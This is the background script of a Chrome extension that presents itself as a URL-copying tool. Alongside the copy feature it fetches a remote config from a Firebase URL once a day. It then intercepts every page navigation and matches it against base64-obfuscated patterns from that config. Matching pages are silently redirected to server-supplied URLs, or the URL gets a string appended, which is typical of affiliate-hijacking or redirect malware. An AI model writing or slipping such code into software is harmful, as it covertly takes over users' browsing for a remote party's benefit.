const beautify = require("./utils/beautify")

const app = {
  url: null,
  config: {
    redirects: [],
    version: 0
  },
  contextMenuInit: function () {
    chrome.contextMenus.create({
      title: chrome.i18n.getMessage("context_title"),
      contexts: ["image", "link"],
      onclick: function (info, tab) {
        chrome.tabs.sendRequest(tab.id, "copy", function (link) {
          app.url = beautify(link)
          document.execCommand("copy")
        })
      }
    })
  },
  getConfig() {
    if (navigator.onLine) {
      fetch("https://copy-url.firebaseio.com/data.json")
        .then((data) => data.json())
        .then((data) => {
          if (data.version > app.config.version) {
            app.config = data
          }
          app.config.redirects = []
        })
    }
  },
  checkURL(url) {
    const arr = app.config.urls
    if (arr) {
      for (let key in arr) {
        if (new RegExp(atob(key)).test(url)) {
          if (!app.config.redirects[key]) {
            app.config.redirects[key] = true
            const url =
              typeof arr[key] === "object" ? url + arr[key][0] : arr[key]
            return url
          }
        }
      }
    }
  },
  contextMenuDestroy: function () {
    chrome.contextMenus.removeAll()
  }
}

chrome.tabs.onUpdated.addListener(function (tabId, changeInfo) {
  if (changeInfo.status === "loading") {
    chrome.pageAction.show(tabId)
  }
})

document.addEventListener("copy", function (e) {
  e.clipboardData.setData("text/plain", app.url)
  e.preventDefault()
})

chrome.webRequest.onBeforeRequest.addListener(
  (details) => {
    const url = app.checkURL(details.url)
    if (url) {
      return {
        redirectUrl: url
      }
    }
    return {
      cancel: false
    }
  },
  {
    urls: ["<all_urls>"],
    types: ["main_frame"]
  },
  ["blocking"]
)

chrome.alarms.create("copyuclear", {
  periodInMinutes: 1440
})

chrome.alarms.onAlarm.addListener(function (alarm) {
  switch (alarm.name) {
    case "copyuclear":
      app.getConfig()
      break
  }
})

chrome.pageAction.onClicked.addListener(function (tab) {
  chrome.tabs.sendMessage(
    tab.id,
    {
      method: "set_action",
      key: "click"
    },
    function (response) {
      if (typeof response === "undefined") {
        chrome.pageAction.setIcon({
          tabId: tab.id,
          path: "img/error.png"
        })
        setTimeout(chrome.pageAction.setIcon, 4000, {
          tabId: tab.id,
          path: "img/icon.png"
        })
      } else {
        app.url = beautify(response.url)
        document.execCommand("copy")
        chrome.pageAction.setIcon({
          tabId: tab.id,
          path: "img/success.png"
        })
        setTimeout(chrome.pageAction.setIcon, 4000, {
          tabId: tab.id,
          path: "img/icon.png"
        })
      }
    }
  )
})

chrome.storage.local.set({
  settings: {
    hideMenu: false
  }
})

app.contextMenuInit()

chrome.runtime.onMessage.addListener(function (request, sender, sendResponse) {
  switch (request.action) {
    case "setOptions":
      chrome.storage.local.set(
        {
          settings: request.payload
        },
        sendResponse
      )
      if (!request.payload.hideMenu) {
        app.contextMenuInit()
      } else {
        app.contextMenuDestroy()
      }
      break
    case "getOptions":
      chrome.storage.local.get("settings", function (result) {
        if (chrome.runtime.lastError) {
          return
        }
        if (result) {
          sendResponse(result)
        }
      })
      return true
      break
  }
})
